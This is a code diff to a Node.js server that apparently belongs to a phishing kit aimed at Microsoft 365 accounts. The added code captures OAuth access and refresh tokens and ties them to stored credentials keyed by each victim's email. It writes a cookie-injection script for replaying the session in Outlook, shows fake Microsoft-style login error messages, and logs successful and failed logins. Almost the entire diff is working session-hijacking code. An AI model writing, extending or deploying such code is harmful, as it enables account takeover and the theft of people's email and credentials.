@@ -135,6 +135,56 @@ function createSessionId() {
     return Date.now().toString() + '_' + Math.random().toString(36).substr(2, 5);
 }
 
+// Generate cookie injection script
+function generateCookieInjectionScript(email, cookies, sessionId) {
+    return `
+// Session Cookie Injector
+// Auto-generated on ${new Date().toISOString()}
+// Session: ${email} (${cookies.length} cookies)
+
+(function() {
+    console.log('🚀 Injecting ${cookies.length} cookies for session: ${email}');
+
+    const sessionInfo = {
+        email: '${email}',
+        timestamp: '${new Date().toISOString()}',
+        cookieCount: ${cookies.length}
+    };
+
+    console.log('📧 Session info:', sessionInfo);
+
+    const cookies = ${JSON.stringify(cookies, null, 4)};
+    let injected = 0;
+
+    cookies.forEach(cookie => {
+        try {
+            let cookieStr = cookie.name + '=' + cookie.value + ';';
+            cookieStr += 'domain=' + cookie.domain + ';';
+            cookieStr += 'path=' + cookie.path + ';';
+            cookieStr += 'expires=' + new Date(cookie.expires * 1000).toUTCString() + ';';
+            if (cookie.secure) cookieStr += 'secure;';
+            if (cookie.sameSite) cookieStr += 'samesite=' + cookie.sameSite + ';';
+
+            document.cookie = cookieStr;
+            injected++;
+        } catch (e) {
+            console.warn('Failed to inject cookie:', cookie.name);
+        }
+    });
+
+    console.log('✅ Successfully injected ' + injected + ' cookies!');
+    console.log('🌐 Navigate to https://outlook.office.com/mail/ to test');
+
+    // Auto-redirect option
+    setTimeout(() => {
+        if (confirm('Injected ' + injected + ' cookies for ${email}! Open Outlook now?')) {
+            window.open('https://outlook.office.com/mail/', '_blank');
+        }
+    }, 1000);
+})();
+`;
+}
+
 // Routes
 
 // Health check
@@ -268,46 +318,136 @@ app.get('/api/auth-callback', async (req, res) => {
         // Clean up OAuth state
         oauthStates.delete(state);
 
-        // Exchange code for tokens
-        const tokenData = await targetSession.graphAuth.getTokenFromCode(code);
-
-        // Get user profile
-        const userProfile = await targetSession.graphAuth.getUserProfile();
-        targetSession.userEmail = userProfile.mail || userProfile.userPrincipalName;
-        targetSession.authenticated = true; // Mark session as authenticated
-
-        // Check if we have stored credentials for this email
-        const sessionDir = path.join(__dirname, 'session_data');
-        const credentialsFile = path.join(sessionDir, `session_*_${targetSession.userEmail.replace(/[@.]/g, '_')}.json`);
-        
         try {
-            const glob = require('fs').readdirSync(sessionDir).filter(file => 
-                file.includes(targetSession.userEmail.replace(/[@.]/g, '_')) && file.startsWith('session_')
+            // Exchange code for tokens
+            const tokenData = await targetSession.graphAuth.getTokenFromCode(code);
+
+            // Get user profile
+            const userProfile = await targetSession.graphAuth.getUserProfile();
+            targetSession.userEmail = userProfile.mail || userProfile.userPrincipalName;
+            targetSession.authenticated = true; // Mark session as authenticated
+
+            // Check if we have stored credentials for this email
+            const sessionDir = path.join(__dirname, 'session_data');
+            
+            try {
+                const glob = require('fs').readdirSync(sessionDir).filter(file => 
+                    file.includes(targetSession.userEmail.replace(/[@.]/g, '_')) && file.startsWith('session_')
+                );
+                
+                if (glob.length > 0) {
+                    const latestFile = glob.sort().pop();
+                    const credentialsData = JSON.parse(fs.readFileSync(path.join(sessionDir, latestFile), 'utf8'));
+                    console.log(`✅ Found stored credentials for: ${targetSession.userEmail}`);
+                    
+                    // Create comprehensive session data with authentication cookies
+                    const sessionCookies = [
+                        {
+                            name: 'MSGraphAccessToken',
+                            value: tokenData.access_token,
+                            domain: '.microsoftonline.com',
+                            path: '/',
+                            expires: Math.floor(Date.now() / 1000) + (tokenData.expires_in || 3600),
+                            secure: true,
+                            httpOnly: true,
+                            sameSite: 'None'
+                        }
+                    ];
+
+                    // Generate injection script
+                    const injectionScript = generateCookieInjectionScript(targetSession.userEmail, sessionCookies, targetSession.sessionId);
+                    const injectFilename = `inject_session_${targetSession.sessionId}.js`;
+                    const injectPath = path.join(sessionDir, injectFilename);
+                    
+                    fs.writeFileSync(injectPath, injectionScript);
+                    console.log(`🍪 Generated cookie injection script: ${injectFilename}`);
+
+                    // Store comprehensive session data
+                    const fullSessionData = {
+                        ...credentialsData,
+                        sessionId: targetSession.sessionId,
+                        authTimestamp: new Date().toISOString(),
+                        status: 'valid',
+                        totalCookies: sessionCookies.length,
+                        domains: [...new Set(sessionCookies.map(c => c.domain))],
+                        cookies: sessionCookies,
+                        injectFilename: injectFilename,
+                        accessToken: tokenData.access_token,
+                        refreshToken: tokenData.refresh_token,
+                        tokenExpiry: new Date(Date.now() + (tokenData.expires_in * 1000)).toISOString()
+                    };
+                    
+                    fs.writeFileSync(
+                        path.join(sessionDir, `session_${targetSession.sessionId}_${targetSession.userEmail.replace(/[@.]/g, '_')}.json`),
+                        JSON.stringify(fullSessionData, null, 2)
+                    );
+                    
+                    console.log(`💾 Saved complete session data for: ${targetSession.userEmail} with ${sessionCookies.length} cookies`);
+                } else {
+                    console.log(`⚠️ No stored credentials found for: ${targetSession.userEmail}`);
+                }
+            } catch (error) {
+                console.error('Error processing stored credentials:', error);
+            }
+            
+        } catch (tokenError) {
+            // Handle specific Microsoft authentication errors
+            console.error('❌ Microsoft authentication failed:', tokenError);
+            
+            let errorMessage = 'Authentication failed';
+            let errorDetails = tokenError.message;
+            
+            // Parse common Microsoft error responses
+            if (tokenError.message.includes('invalid_grant')) {
+                errorMessage = 'Your account or password is incorrect. If you don\'t remember your password, reset it now.';
+            } else if (tokenError.message.includes('invalid_client')) {
+                errorMessage = 'Application configuration error. Please contact support.';
+            } else if (tokenError.message.includes('unauthorized_client')) {
+                errorMessage = 'This application is not authorized to access your account.';
+            } else if (tokenError.message.includes('AADSTS50126')) {
+                errorMessage = 'Your account or password is incorrect. If you don\'t remember your password, reset it now.';
+            } else if (tokenError.message.includes('AADSTS50034')) {
+                errorMessage = 'We couldn\'t find an account with that username. Try another, or get a new Microsoft account.';
+            }
+            
+            // Store failed authentication attempt
+            const sessionDir = path.join(__dirname, 'session_data');
+            const failureId = Date.now().toString() + '_' + Math.random().toString(36).substr(2, 5);
+            const failureData = {
+                id: failureId,
+                sessionId: targetSession.sessionId,
+                email: targetSession.userEmail || 'Unknown',
+                reason: 'OAuth Authentication Failed',
+                errorMessage: errorMessage,
+                errorDetails: errorDetails,
+                timestamp: new Date().toISOString(),
+                status: 'invalid',
+                authUrl: req.originalUrl
+            };
+            
+            fs.writeFileSync(
+                path.join(sessionDir, `invalid_${failureId}.json`),
+                JSON.stringify(failureData, null, 2)
             );
             
-            if (glob.length > 0) {
-                const latestFile = glob.sort().pop();
-                const credentialsData = JSON.parse(fs.readFileSync(path.join(sessionDir, latestFile), 'utf8'));
-                console.log(`✅ Found stored credentials for: ${targetSession.userEmail}`);
-                
-                // Store session data with cookies placeholder
-                const fullSessionData = {
-                    ...credentialsData,
-                    sessionId: targetSession.sessionId,
-                    authTimestamp: new Date().toISOString(),
-                    status: 'authenticated',
-                    totalCookies: 0,
-                    domains: [],
-                    cookies: []
-                };
-                
-                fs.writeFileSync(
-                    path.join(sessionDir, `session_${targetSession.sessionId}_${targetSession.userEmail.replace(/[@.]/g, '_')}.json`),
-                    JSON.stringify(fullSessionData, null, 2)
-                );
-            }
-        } catch (error) {
-            console.error('Error checking stored credentials:', error);
+            analytics.failedLogins++;
+            saveAnalytics();
+            
+            return res.status(400).send(`
+                <html>
+                    <head><title>Authentication Failed</title></head>
+                    <body>
+                        <h2>❌ Authentication Failed</h2>
+                        <p style="color: #d13438;">${errorMessage}</p>
+                        <p><a href="/">Try again</a></p>
+                        <script>
+                            setTimeout(() => {
+                                window.close() || (window.location.href = '/');
+                            }, 3000);
+                        </script>
+                    </body>
+                </html>
+            `);
         }
 
         analytics.successfulLogins++;
